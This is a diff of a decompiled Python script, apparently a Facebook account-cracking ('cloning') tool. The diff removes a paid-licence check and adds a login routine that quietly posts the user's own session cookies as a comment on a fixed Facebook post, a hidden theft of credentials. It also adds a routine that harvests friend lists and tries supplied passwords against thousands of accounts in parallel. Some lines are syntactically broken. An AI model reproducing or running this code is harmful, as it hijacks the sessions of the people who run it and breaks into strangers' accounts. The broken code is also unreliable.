@@ -1,4 +1,4 @@
-# Decompile by Mardis (Tools By Kapten-Kaizo)
+# Decompile by Mardis (Tools By Jalil)
 # Time Succes decompile : 2023-01-01 09:30:57.607344
 
 from os import path
@@ -11,8 +11,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-       ### os.system('python JALIIIL.py')
-except:pass
+       ### os.system('python jaliiil.py)except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 try:
@@ -22,6 +21,7 @@ except Exception as e:
     print('\033[1;34m[√] WELCOME TO JALIIIL TOOL')
 	
 proxies=open('proxies.txt','r').read().splitlines()
+
 
 android_models=[]
 try:
@@ -65,51 +65,30 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-##______COLORS____ARE________######
-pwx=[]
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-S = '\033[96;1m'
-N = '\x1b[0m'
-PURPLE ='\x1b[38;5;46m'
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-BLACK="\033[1;30m"
-EXTRA ='\x1b[38;5;208m'
-#________________________________________#
 
-logo=(f"""{WHITE}
-   oooo       .o.       ooooo        ooooo ooooo        
-   `888      .888.      `888'        `888' `888'        
-    888     .8"888.      888          888   888         
-    888    .8' `888.     888          888   888         
-    888   .88ooo8888.    888          888   888         
-    888  .8'     `888.   888       o  888   888       o 
-.o. 88P o88o     o8888o o888ooooood8 o888o o888ooooood8 
-`Y888P                                      {GREEN}A {RED}L {WHITE}G
-_______________________________________________________
-_______________________________________________________
 
-\t[×] Developed By {EXTRA}JALIL
- {WHITE}[•] Admin       : {RED}JALIL
- {WHITE}[•] Telegram    : ITZJALIL0
- {WHITE}[•] WhatsApp    : {GREEN}+213676980481
- {WHITE}[•] Facebook    : H. M. JALIL
- [•] Version     : {RED}1.6
 
-{WHITE}================================================
-   \33[37;41m\t WELCOME  TO  JALIIIL   TOOL \33[0;m
-{WHITE}=================================================""")
+
+logo=("""
+\033[1;37m----------------------------------------------------------------------------------------------------------------------
+ 
+\033[1;95m (___  ___)   (    )   (_   _)      (_   _) (_   _)     
+\033[1;95m     ) )      / /\ \     | |          | |     | |       
+\033[1;95m    ( (      ( (__) )    | |          | |     | |       
+\033[1;95m __  ) )      )    (     | |   __     | |     | |   __  
+\033[1;95m( (_/ /      /  /\  \  __| |___) )   _| |__ __| |___) ) 
+\033[1;95m \___/      /__(  )__\ \________/   /_____( \________/  
+
+\033[1;37m----------------------------------------------------------------------------------------------------------------------
+\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m TELEGRAM  \033[1;91m : \033[1;95mITZJALIL0
+\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mH. M. JALIL
+\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mJALILHA
+\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mPAID                             
+\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m1.4
+\033[1;37m----------------------------------------------------------------------------------------------------------------------""")
+
 def linex():
-    print('\033[1;37m----------------------------------------------')
+        print('\033[1;37m-----------------------------------------------------------------------------------------------------------------------')
 def clear():
         os.system('clear')
         print(logo)
@@ -119,94 +98,159 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-import pycurl
-from io import BytesIO
-def get_response(url):
-    response_buffer = BytesIO()
-
-    curl = pycurl.Curl()
-    curl.setopt(curl.URL, url)
-    curl.setopt(curl.WRITEDATA, response_buffer)
-
-    try:
-        curl.perform()
-    except pycurl.error as e:
-        return f"Error: {e}"
-
-    response = response_buffer.getvalue().decode('utf-8')
-    curl.close()
-
-    return response
-
-def remove_symbols_and_spaces(input_string):
-    cleaned_string = re.sub(r'[^a-zA-Z0-9#]', '', input_string)
-    return cleaned_string
-    
-def approval():
-  os.system('clear')
-  print(logo)
-  import platform
-  uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
-  id = remove_symbols_and_spaces(uuid)
-  k1,k2,k3,k4=id[:4],id[3:6],id[4:9],id[9:]
-  intuid=int(id.split("#")[0])
-  pref=str((intuid-104729)*2-37+(1-2**7))
-  suff=str((intuid-523217)%104729)
-  realid=(suff+k3+k1+k4+k2+pref).encode().hex()
-  try:
-    httpCaht = get_response('https://raw.githubusercontent.com/jalilha/jalil/main/jalil.txt')
-    if realid in httpCaht:
-      #print("\3[1;32m YOUR KEY IS APPROVED.")
-      #msg = str(os.geteuid())
-      pass
-    else:
-      print("\33[1;32m YOUR KEY :\x1b[38;5;46m "+id)
-      print('\33[1;37m ====================================================')
-      print("\33[1;37m ====================================================")
-      print("\33[1;36m NOTE:- THIS TOOL IS PAID \n YOU HAVE TO PAY FOR APPROVAL FIRST .")
-      print('\33[1;37m ====================================================')
-      print (" \33[37;41m\t WELCOME TO USMIII TOOL AND ENJOY \33[0;m")
-      print('\33[1;37m ====================================================')
-
-      print ("\33[1;37m SEND 500DA (FOR 15 DAYS APPROVEL)")
-      print('\33[1;37m ====================================================')
-      print ("\33[1;37m SEND 3 $ usd (FOR 15 DAYS APPROVEL)")
-      print('\33[1;37m ====================================================')
-      print ("\33[1;37m SEND 900DA (FOR 30 DAYS APPROVEL)")
-      print('\33[1;37m ====================================================')
-      print ("\33[1;37m SEND 5 $ usd (FOR 30 DAYS APPROVEL)")
-      print('\33[1;37m ====================================================')
-      print ("\33[1;37m JALIL PHONE (+213676980481)")
-      print ("\33[37;41m\t SUBSCRIBE TO THE BEST TOOL NOW  \33[0;m")
-      input(' IIF YOU ARE FREE USER THEN DONT PRESS ENTER')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/213676980481'+tks)
-      sys.exit()
-      #time.sleep(1)
-      #approval()
-  except Exception as error:
-    print(error)                        
-
-
+def login():
+        clear()
+        cookies = input(' Put cookies: ')
+        try:
+                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+                find_token = re.search("(EAAG\w+)", data.text)
+                open(".tok.txt", "w").write(find_token.group(1))
+                open(".coki.txt","w").write(cookies)
+                tok=open('.tok.txt','r').read()
+                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
+                name=(info['name'])
+                idd=(info['id'])
+                barth=(info['birthday'])
+                linex()
+                print(' Welcome\033[1;32m : '+name)
+                print(' \033[1;37mYour UID : '+idd)
+                print(' Barth Day: '+barth)
+                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
+                linex()
+                print(' Cookies login has been successfull...')
+                time.sleep(1)
+                menu()
+        except KeyError:
+                print('\033[1;31m Cookies has been expired...')
+                os.system('rm -rf .tok.txt');time.sleep(1);login()
+        except requests.exceptions.ConnectionError:
+                exit(' internet connection error...')
+        except AttributeError:
+                print('\033[1;31m Cookies has been expired...')
+                os.system('rm -rf .tok.txt');time.sleep(1);login()
+                login()
+def public():
+        usrr=[]
+        clear()
+        try:
+                tok = open('.tok.txt','r').read()
+                cok = open('.coki.txt','r').read()
+                tokenku.append(tok)
+        except KeyError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        except IOError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        try:
+                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
+                name=(info['name'])
+                print('\033[1;32m Welcome '+name)
+                linex()
+        except KeyError:
+                print('\033[1;31mYour cookies han expired...');time.sleep(1)
+                login()
+        try:
+                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
+        except ValueError:
+                exit(' Put only digits not latters ')
+        if jum<1 or jum>5000:
+                exit()
+        ses=requests.Session()
+        yz = 0
+        for met in range(jum):
+                yz+=1
+                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
+                usrr.append(kl)
+        linex()
+        print(' All method working try  ')
+        linex()
+        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for mix ids)\n [3] Method 3 (for old ids)')
+        linex()
+        mthd = input(' Choose method: ')
+        linex()
+        print(' Do you went show cp account? (y/n): ')
+        linex()
+        cx=input(' Choose: ')
+        if cx in ['y','Y','yes','Yes','1']:
+                pcp.append('y')
+        else:
+                pcp.append('n')
+        linex()
+        print('\033[1;32m Dumping friend list...\033[1;37m')
+        linex()
+        for userr in usrr:
+                try:
+                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+                        for mi in col['friends']['data']:
+                                try:
+                                        iso = (mi['id']+'|'+mi['name'])
+                                        if iso in id:pass
+                                        else:id.append(iso)
+                                except:continue
+                except (KeyError,IOError):
+                        pass
+                except requests.exceptions.ConnectionError:
+                        exit(f' No internet connection')
+        try:
+                plist = []
+                try:
+                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                except:
+                        ps_limit =1
+                linex()
+                print('\033[1;32m exp: first last,firtslast,first123')
+                linex()
+                for i in range(ps_limit):
+                        plist.append(input(f' Put password {i+1}: '))
+                with tred(max_workers=30) as crack_submit:
+                        clear()
+                        total_ids = str(len(id))
+                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in id:
+                                ids,names = user.split('|')
+                                passlist = plist
+                                if mthd in ['1','01']:
+                                        crack_submit.submit(ffb,ids,names,passlist)
+                                elif mthd in ['2','02']:
+                                        crack_submit.submit(api,ids,names,passlist)
+                                else:
+                                        crack_submit.submit(api1,ids,names,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python jaliiil.py')
+        except requests.exceptions.ConnectionError:
+                exit(f' No internet connection')
+        except (KeyError,IOError):
+                print(f' No friends for {userr}')
+                time.sleep(3)
+                public()
 def menu():
         try:
-                approval()
-                #clear()
+                clear()
+        #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning\n [2] Create ids file\n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [0] Exit menu')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
                                 clear()
-                                print(' PUT FILE EXAMPLE :  /sdcard/jalil.txt.etc..')
+                                print(' Put file example:  /sdcard/File.txt  etc..')
                                 linex()
-                                file = input(' PUT FILE PATH\033[1;37m: ')
+                                file = input(' Put file path\033[1;37m: ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(' File location not found ')
                                         time.sleep(1)
                                         menu()
-				except FileNotFoundError:
-					#print(' FILE LOCATION NOT FOUND ')
                                 clear()
                                 print(' All method working try 1 by 1 ')
                                 linex()
